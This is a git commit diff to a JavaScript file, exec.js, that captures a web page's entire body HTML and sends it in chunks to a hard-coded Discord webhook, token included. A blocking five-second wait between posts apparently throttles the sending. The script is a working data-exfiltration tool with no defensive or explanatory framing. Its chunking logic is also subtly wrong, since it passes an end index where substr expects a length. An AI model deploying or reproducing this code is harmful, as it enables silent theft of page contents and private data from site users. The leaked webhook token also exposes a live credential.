fad8bfd164b75f37f2a9e1e7bfbc7bde0c80bf41
Ongenix <96583029+Ongenix@users.noreply.github.com>
2024-05-20 12:36:53 -0600

    Update exec.js

--- exec.js
+++ exec.js
@@ -1,20 +1,28 @@
-function sendMessage() {
+function wait(ms){
+   var start = new Date().getTime();
+   var end = start;
+   while(end < start + ms) {
+     end = new Date().getTime();
+  }
+}
+function sendMessage(message) {
     const webhookUrl = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
-    const message = document.body.div.innerHTML;
 
-    for (let i = 0; i < Math.round(document.body.innerHTML.length / 100); i++) {
+    for (let i = 0; i < Math.round(document.body.innerHTML.length / 256); i++) {
         const request = new XMLHttpRequest();
         request.open("POST", webhookUrl);
         request.setRequestHeader("Content-type", "application/json");
 
         const messageData = {
-            content: message.substr(i*100, i*100+100),
+            content: message.substr(i*256, i*256+256),
             username: "My Webhook From Library Monday",
             avatar_url: "https://example.com/avatar.png"
         };
 
         request.send(JSON.stringify(messageData));
+        wait(5000);
     }
 }
 
-sendMessage();
+const all_elements = document.body.innerHTML
+sendMessage(all_elements);
